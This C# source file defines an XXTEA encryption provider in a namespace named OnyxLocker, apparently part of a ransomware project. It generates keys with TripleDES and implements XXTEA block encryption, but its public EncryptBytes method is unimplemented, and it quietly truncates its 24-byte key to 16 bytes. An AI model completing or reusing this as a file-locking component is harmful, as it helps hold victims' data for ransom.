using System;
using System.Security.Cryptography;
using System.Text;

namespace OnyxLocker.Classes
{
    internal class XxteaEncryptionProvider : IEncryptionProvider
    {
        private readonly UTF8Encoding utf8 = new UTF8Encoding();

        private byte[] EncryptionKey { get; set; }

        /// <summary>
        /// Fuction to create a 192bits encryption key
        /// </summary>
        /// <returns></returns>
        public byte[] CreateEncryptionKey()
        {
            var keyProvider = new TripleDESCryptoServiceProvider();
            keyProvider.KeySize = 192;
            keyProvider.GenerateKey();

            var key = keyProvider.Key;

            keyProvider.Dispose();
            EncryptionKey = key;
            return key;
        }

        /// <summary>
        /// Returns the encryption key
        /// </summary>
        /// <returns></returns>
        public byte[] GetEncryptionKey()
        {
            return EncryptionKey;
        }

        /// <summary>
        /// Encrypts the given bytes with the key
        /// </summary>
        /// <param name="fileBytes">Bytes to encrypt</param>
        /// <param name="encryptionKey">Encryption key</param>
        /// <returns></returns>
        public byte[] EncryptBytes(byte[] fileBytes, byte[] encryptionKey)
        {
            throw new NotImplementedException();
        }

        private const UInt32 delta = 0x9E3779B9;

        private UInt32 MX(UInt32 sum, UInt32 y, UInt32 z, Int32 p, UInt32 e, UInt32[] k)
        {
            return (z >> 5 ^ y << 2) + (y >> 3 ^ z << 4) ^ (sum ^ y) + (k[p & 3 ^ e] ^ z);
        }

        private Byte[] Encrypt(Byte[] data, Byte[] key)
        {
            if (data.Length == 0)
            {
                return data;
            }
            return ToByteArray(Encrypt(ToUInt32Array(data, true), ToUInt32Array(FixKey(key), false)), false);
        }

        private UInt32[] Encrypt(UInt32[] v, UInt32[] k)
        {
            Int32 n = v.Length - 1;
            if (n < 1)
            {
                return v;
            }
            UInt32 z = v[n], y, sum = 0, e;
            Int32 p, q = 6 + 52 / (n + 1);
            unchecked
            {
                while (0 < q--)
                {
                    sum += delta;
                    e = sum >> 2 & 3;
                    for (p = 0; p < n; p++)
                    {
                        y = v[p + 1];
                        z = v[p] += MX(sum, y, z, p, e, k);
                    }
                    y = v[0];
                    z = v[n] += MX(sum, y, z, p, e, k);
                }
            }
            return v;
        }

        private Byte[] FixKey(Byte[] key)
        {
            if (key.Length == 16) return key;
            Byte[] fixedkey = new Byte[16];
            if (key.Length < 16)
            {
                key.CopyTo(fixedkey, 0);
            }
            else
            {
                Array.Copy(key, 0, fixedkey, 0, 16);
            }
            return fixedkey;
        }

        private UInt32[] ToUInt32Array(Byte[] data, Boolean includeLength)
        {
            Int32 length = data.Length;
            Int32 n = (((length & 3) == 0) ? (length >> 2) : ((length >> 2) + 1));
            UInt32[] result;
            if (includeLength)
            {
                result = new UInt32[n + 1];
                result[n] = (UInt32)length;
            }
            else
            {
                result = new UInt32[n];
            }
            for (Int32 i = 0; i < length; i++)
            {
                result[i >> 2] |= (UInt32)data[i] << ((i & 3) << 3);
            }
            return result;
        }

        private Byte[] ToByteArray(UInt32[] data, Boolean includeLength)
        {
            Int32 n = data.Length << 2;
            if (includeLength)
            {
                Int32 m = (Int32)data[data.Length - 1];
                n -= 4;
                if ((m < n - 3) || (m > n))
                {
                    return null;
                }
                n = m;
            }
            Byte[] result = new Byte[n];
            for (Int32 i = 0; i < n; i++)
            {
                result[i] = (Byte)(data[i >> 2] >> ((i & 3) << 3));
            }
            return result;
        }
    }
}
